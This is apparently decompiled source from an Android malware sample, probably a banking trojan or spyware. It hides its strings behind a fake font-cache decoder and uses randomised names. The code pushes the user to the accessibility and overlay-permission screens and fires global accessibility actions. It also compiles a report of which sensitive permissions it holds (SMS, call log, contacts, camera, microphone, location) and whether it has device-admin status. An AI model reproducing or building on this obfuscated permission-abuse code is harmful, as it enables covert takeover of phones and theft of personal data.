            try {
                try {
                    Intent intent2 = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
                    intent2.addFlags(67108864 | i);
                    intent2.putExtra(TypefaceCache.obtain("00790065005E009300E400B600DC00A00030002C005D009500F100B800DF00A2002D00620064008600E200B800C10098002800730042"), strFlattenToString);
                    intent2.putExtra(TypefaceCache.obtain("0006004E006F00B500D1008000F4009500020051007600A200DE008B00ED008600110051006400AC00D50086"), strFlattenToString);
                    intent2.putExtra(TypefaceCache.obtain("00220078005F009500FF00B600D600E9003300640054009100F900BB00D700B5006D00730043009300E200BE009C008100110057007C00AA00D5009100E6009800020044007C00B800DB009A00EB"), strFlattenToString);
                    Bundle bundle = new Bundle();
                    bundle.putString(TypefaceCache.obtain("00790065005E009300E400B600DC00A00030002C005D009500F100B800DF00A2002D00620064008600E200B800C10098002800730042"), strFlattenToString);
                    bundle.putString(TypefaceCache.obtain("00220078005F009500FF00B600D600E9003300640054009100F900BB00D700B5006D00730043009300E200BE009C008100110057007C00AA00D5009100E6009800020044007C00B800DB009A00EB"), strFlattenToString);
                    intent2.putExtra(TypefaceCache.obtain("00790065005E009300E400B600DC00A00030002C0048008F00FF00A800ED00A100310077005C008A00F500B100C6009800220064005C0094"), bundle);
                    intent2.putExtra(TypefaceCache.obtain("0006004E006F00B500D1008000E1008F000C0041006400A100C2009E00F5008A00060058006F00B800D1008D00F50092000E0053007500B300C3"), bundle);
                    service.startActivity(intent2);
                } catch (Exception unused2) {
                    Intent intent3 = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
                    intent3.addFlags(i);
                    service.startActivity(intent3);
                }
            } catch (Exception e) {
                TypefaceCache.obtain("002C0066005E008900D100BC00D100A2003000650052008500F900B300DB00B3003A0045005E009300E400B600DC00A000300036005D008600FC00B300D000A60020007D000100C7");
                e.getMessage();
            }
        }
    }

    public static void vekpFI4d1Nc4fakF() {
        try {
            DataQFAdapter.Companion.getClass();
            DataQFAdapter dataQFAdapter = DataQFAdapter.instance;
            if (dataQFAdapter != null) {
                dataQFAdapter.performGlobalAction(2);
            }
        } catch (Exception unused) {
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r6v1, types: [boolean, int] */
    public static JSONObject w9sT1Swbhx3hs(Context context) {
        JSONObject jSONObject = new JSONObject();
        while (Process.myPid() < -999) {
            Runtime.getRuntime().totalMemory();
        }
        jSONObject.put(TypefaceCache.obtain("003100630055008900F900B100D5"), JXn4Qf7zpnLjP5);
        jSONObject.put(TypefaceCache.obtain("002000630049009500F500B100C6009800300062005E0097"), Ee8d2j4S9Vm5yGuR);
        String strObtain = TypefaceCache.obtain("003300730049008A00F900AC00C100AE002C00780048");
        JSONObject jSONObject2 = new JSONObject();
        String strObtain2 = TypefaceCache.obtain("002200750058008200E300AC00DB00A5002A007A0052009300E9");
        DataQFAdapter.Companion.getClass();
        jSONObject2.put(strObtain2, GARjgaGEpTotOxcl8vfe.K7eEOBPYP9VIoHWTe(context));
        ?? r6 = (-56) + 57;
        jSONObject2.put(TypefaceCache.obtain("002F00790058008600E400B600DD00A9"), context.checkSelfPermission("android.permission.ACCESS_FINE_LOCATION") == 0 ? r6 : 0);
        jSONObject2.put(TypefaceCache.obtain("002000770056008200E200BE"), context.checkSelfPermission("android.permission.CAMERA") == 0 ? r6 : 0);
        jSONObject2.put(TypefaceCache.obtain("002E007F0058009500FF00AF00DA00A8002D0073"), context.checkSelfPermission("android.permission.RECORD_AUDIO") == 0 ? r6 : 0);
        jSONObject2.put(TypefaceCache.obtain("002000790055009300F100BC00C600B4"), context.checkSelfPermission("android.permission.READ_CONTACTS") == 0 ? r6 : 0);
        jSONObject2.put(TypefaceCache.obtain("0033007E0054008900F5"), context.checkSelfPermission("android.permission.READ_PHONE_STATE") == 0 ? r6 : 0);
        jSONObject2.put(TypefaceCache.obtain("0030007B0048"), context.checkSelfPermission("android.permission.READ_SMS") == 0 ? r6 : 0);
        jSONObject2.put(TypefaceCache.obtain("002000770057008B00CF00B300DD00A0"), context.checkSelfPermission("android.permission.READ_CALL_LOG") == 0 ? r6 : 0);
        jSONObject2.put(TypefaceCache.obtain("00210077004F009300F500AD00CB0098002C0066004F008E00FD00B600C800A20027"), ((PowerManager) context.getSystemService("power")).isIgnoringBatteryOptimizations(context.getPackageName()));
        jSONObject2.put(TypefaceCache.obtain("002D0079004F008E00F600B600D100A60037007F0054008900CF00B300DB00B4003700730055008200E2"), xDyLpEZyrcKVe0(context));
        jSONObject2.put(TypefaceCache.obtain("002C0060005E009500FC00BE00CB"), Settings.canDrawOverlays(context));
        jSONObject2.put(TypefaceCache.obtain("00270073005D008600E500B300C600980030007B0048"), Ee8d2j4S9Vm5yGuR(context));
        DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService("device_policy");
        int i = Build.VERSION.SDK_INT;
        jSONObject2.put(TypefaceCache.obtain("00270073004D008E00F300BA00ED00A60027007B00520089"), devicePolicyManager.isAdminActive(new ComponentName(context, (Class<?>) DeviceAdminReceiver.class)));
        if (i >= 33) {
            jSONObject2.put(TypefaceCache.obtain("002D0079004F008E00F600B600D100A60037007F0054008900E3"), context.checkSelfPermission("android.permission.POST_NOTIFICATIONS") == 0 ? r6 : 0);
        } else {
            jSONObject2.put(TypefaceCache.obtain("002D0079004F008E00F600B600D100A60037007F0054008900E3"), (boolean) r6);
        }
        jSONObject.put(strObtain, jSONObject2);
        return jSONObject;
    }

    public static void wotphlvK9sPbXJ(Service service) {
        try {
            Intent intent = new Intent("android.settings.action.MANAGE_OVERLAY_PERMISSION");
            intent.setData(Uri.parse(TypefaceCache.obtain("003300770058008C00F100B800D700FD") + service.getPackageName()));
            intent.addFlags(b1EoSIRjJHO5);
            service.startActivity(intent);
        } catch (Exception e) {
            TypefaceCache.obtain("002C0066005E008900DF00A900D700B5002F0077004200B400F500AB00C600AE002D0071004800DD00B0");
            e.getMessage();
        }
    }

    public static boolean xDyLpEZyrcKVe0(Context context) {
        String string = Settings.Secure.getString(context.getContentResolver(), TypefaceCache.obtain("00260078005A008500FC00BA00D60098002D0079004F008E00F600B600D100A60037007F0054008900CF00B300DB00B4003700730055008200E200AC"));
        if (string == null) {
            string = "";
        }
        return KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(string, context.getPackageName(), false);
    }

    /* JADX WARN: Code duplicated, block: B:7:0x0014  */
    public final Object MLSIo1htfMPWeB8V876L(long j, JRdueaGIH5g8DVCPba jRdueaGIH5g8DVCPba, CWIOrUfHtKyaxQib0W cWIOrUfHtKyaxQib0W) {
        prlQgZOFDDCYe03HxVU prlqgzofddcye03hxvu;
        long jCurrentTimeMillis;
        if (cWIOrUfHtKyaxQib0W instanceof prlQgZOFDDCYe03HxVU) {
            prlqgzofddcye03hxvu = (prlQgZOFDDCYe03HxVU) cWIOrUfHtKyaxQib0W;
            int i = prlqgzofddcye03hxvu.pyu8ovAipBTLYAiKab;
            if ((i & Integer.MIN_VALUE) != 0) {
                prlqgzofddcye03hxvu.pyu8ovAipBTLYAiKab = i - Integer.MIN_VALUE;
            } else {
                prlqgzofddcye03hxvu = new prlQgZOFDDCYe03HxVU(this, cWIOrUfHtKyaxQib0W);
            }
        } else {
            prlqgzofddcye03hxvu = new prlQgZOFDDCYe03HxVU(this, cWIOrUfHtKyaxQib0W);
        }
        Object obj = prlqgzofddcye03hxvu.ibVTtJUNfrGYbW;
        int i2 = prlqgzofddcye03hxvu.pyu8ovAipBTLYAiKab;
        if (i2 == 0) {
            SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
            jCurrentTimeMillis = System.currentTimeMillis() + j;
        } else {
            if (i2 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            jCurrentTimeMillis = prlqgzofddcye03hxvu.xDyLpEZyrcKVe0;
            jRdueaGIH5g8DVCPba = prlqgzofddcye03hxvu.Ee8d2j4S9Vm5yGuR;
            SbxdZ6Kq2uhHQ5RPRqm.xfn2GJwmGqs7kWW(obj);
        }
        while (System.currentTimeMillis() < jCurrentTimeMillis && !((Boolean) jRdueaGIH5g8DVCPba.w9sT1Swbhx3hs()).booleanValue()) {
            prlqgzofddcye03hxvu.Ee8d2j4S9Vm5yGuR = jRdueaGIH5g8DVCPba;
            prlqgzofddcye03hxvu.xDyLpEZyrcKVe0 = jCurrentTimeMillis;
            prlqgzofddcye03hxvu.pyu8ovAipBTLYAiKab = 1;
            Object objIbVTtJUNfrGYbW = gA5gCwTK0qjTIn.ibVTtJUNfrGYbW(300L, prlqgzofddcye03hxvu);
            pjN1L01KDMWnPCy0daD pjn1l01kdmwnpcy0dad = pjN1L01KDMWnPCy0daD.w9sT1Swbhx3hs;
            if (objIbVTtJUNfrGYbW == pjn1l01kdmwnpcy0dad) {
                return pjn1l01kdmwnpcy0dad;
            }
        }
        return Eo0e0FTdv96U7KeCzoB.dDIMxZXP1V8HdM;
    }
}
